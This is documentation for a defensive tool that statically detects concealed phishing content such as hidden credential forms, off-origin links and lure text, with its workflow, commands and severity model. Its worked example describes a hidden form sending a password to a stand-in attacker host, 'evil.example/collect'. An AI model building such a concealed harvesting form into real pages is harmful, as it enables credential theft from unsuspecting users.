# Visibility-Aware HTML Analysis (Hidden-Content Evasion)

> **Module ID:** VIS-HTML-001
> **Version:** 1.0.0
> **Phase:** Emerging Technologies of Cybercrime Defense
> **Classification:** Concealed-content / cloaking detection for phishing pages
> **Research basis:** Lucas Betts, Eric Spero, Robert Biddle, Danielle Lottridge,
> Giovanni Russello (University of Auckland) — *"Visibility-Aware HTML Analysis through
> Renderer-Level Extraction"*, APWG eCrime 2026.

---

## 1. Overview

Surfaces content a phishing page **hides** from a casual viewer: hidden credential forms,
hidden inputs, hidden off-origin links, and off-screen brand/lure text. The eCrime paper's
premise is that analysing raw HTML without knowing what actually renders is misleading —
phishing kits hide, cloak, and off-screen content to evade humans and naive parsers, so
detection must be *visibility-aware*.

A full solution needs a renderer; this module implements the **static, keyless
approximation** that catches the common concealment idioms, and is explicit that
renderer-level confirmation (the tool's Playwright / `agent-browser` path) is the upgrade for
JS-injected or computed styles.

**What it flags** (each with the concealment reason and a snippet):

- **Inline hiding** — `display:none`, `visibility:hidden`, `opacity:0`, `font-size:0`,
  zero width/height, `text-indent:-9999px`, off-screen `position`, `clip`, the bare `hidden`
  attribute.
- **Class-based hiding** — a `<style>` rule that sets a hiding property, then any element
  carrying that class (kits reuse `.hidden`/`.d-none`/`.sr-only` heavily).
- **Concealed intent** — a hidden element carrying a **link**, a **form**, a
  **password/credential input**, or **brand/lure** keywords. This is the part that matters:
  hidden boilerplate is noise; a hidden credential form posting off-domain is evasion.

**When to use:** on every collected phishing/scam page during analysis, and whenever a page
"looks empty" but is flagged elsewhere.

---

## 2. Tool Inventory

| Priority | Tool | Purpose | Install |
|----------|------|---------|---------|
| Primary | `scripts/html_visibility_analysis.py` | Static hidden-content analyzer (stdlib `html.parser`) | none |
| Upgrade | `agent-browser` / Playwright | renderer-level (true computed visibility) | optional |

Fully keyless, stdlib only (no BeautifulSoup). Never fetches or renders.

---

## 3. Investigation Workflow

```
1. Collect the page HTML (WebPivot / agent-browser / curl)
2. Run html_visibility_analysis.py --origin <page-host> [--brand <name> ...]
3. Triage findings by severity:
     HIGH   -> hidden credential input, OR hidden form posting off-origin
     MEDIUM -> hidden off-origin link, or hidden brand/lure text
     LOW    -> hidden content with no malicious-intent signal
4. For a HIGH, capture the off-origin form action / credential field as evidence + IOC
5. If suspicious but LOW/none, re-check with the renderer path (computed styles / JS)
```

---

## 4. CLI Commands & Expected Output

```bash
# Saved page, judging off-origin against the real host, watching for brand abuse
python3 scripts/html_visibility_analysis.py page.html --origin bank.example --brand paypal

# Collected DOM on stdin
curl -s https://suspicious.example/ | python3 scripts/html_visibility_analysis.py - --origin suspicious.example

# JSON for the pipeline
python3 scripts/html_visibility_analysis.py page.html --json -o hidden.json
```

**Output:** `verdict` (none/low/medium/high) + high/medium/low counts, `hiding_classes`
discovered from `<style>`, a severity-sorted `findings` list (kind, severity, concealment
reason, detail), rationale, and the renderer-level caveat.

**Worked example** — a `display:none` block wrapping `<form action="https://evil.example/
collect"><input type=password></form>`, an `.sr-only` span reading "PayPal … verify your
account", and a `visibility:hidden` off-origin link returns **HIGH** (hidden off-origin
credential form + hidden password field), while an ordinary visible form with a
`type=hidden name=csrf_token` input returns **none** (CSRF fields are not flagged).

---

## 5. Severity Model

| Severity | Trigger |
|----------|---------|
| **HIGH** | hidden password/credential input; hidden form whose `action` leaves the page origin |
| **MEDIUM** | hidden link to another host; hidden text containing a brand or lure keyword |
| **LOW** | hidden content with no malicious-intent signal (reported for completeness) |

A bare `<input type=hidden>` is normal HTML (CSRF/session/form-state) and is reported **only**
when its name is credential-like — the earlier design flagged CSRF fields, which would fire on
every legitimate form.

---

## 6. Output Interpretation

- A **hidden off-origin credential form** is a near-certain phishing-evasion finding — the page
  shows an innocuous face while a concealed form harvests to an attacker host.
- **Class-based hits** (`hiding_classes`) show the kit's own concealment vocabulary — a useful
  fingerprint to cluster sibling kits.
- **`note`** is load-bearing: this is a static approximation. Computed/JS-injected visibility is
  not evaluated — a clean result is "no *static* concealment found", not "nothing hidden".

---

## 7. Confidence Ratings

| Finding | Confidence | Notes |
|---------|-----------|-------|
| hidden off-origin credential form | HIGH | strong evasion signal |
| hidden password field in a hidden container | HIGH | harvest-staging |
| hidden brand/lure text | MEDIUM | corroborate with the rest of the page |
| hidden boilerplate (LOW) | LOW | often benign (a11y, templates) |

---

## 8. Limitations

- **Static only.** JavaScript that hides/reveals at runtime, or styles computed from external
  CSS/media queries, are not resolved — use the renderer path to confirm true visibility.
- **Naive `<style>` parsing** associates a selector with its rule body by brace-splitting;
  complex/minified CSS may miss a class (false negatives, never a fabricated hit).
- **Off-origin judgement needs `--origin`;** without it, any absolute URL is treated as off-page.

---

## 9. Command Reference

### `html_visibility_analysis.py <html|-> [--origin HOST] [--brand NAME]`

**Input:** page HTML (file or stdin).
**Process:** collect hiding classes from `<style>`, walk the DOM tracking a hidden-ancestor
stack, classify concealed links/forms/inputs/text by intent and origin.
**Output:** verdict, counts, hiding classes, severity-sorted findings, caveat (text or JSON).

Regression-tested by `tests/test_html_visibility_analysis.py` (run in `scripts/audit.sh`),
including the CSRF-false-positive and off-origin-vs-relative guards.

---

*Visibility-Aware HTML Analysis Module v1.0.0 — for authorized threat-intelligence use.*
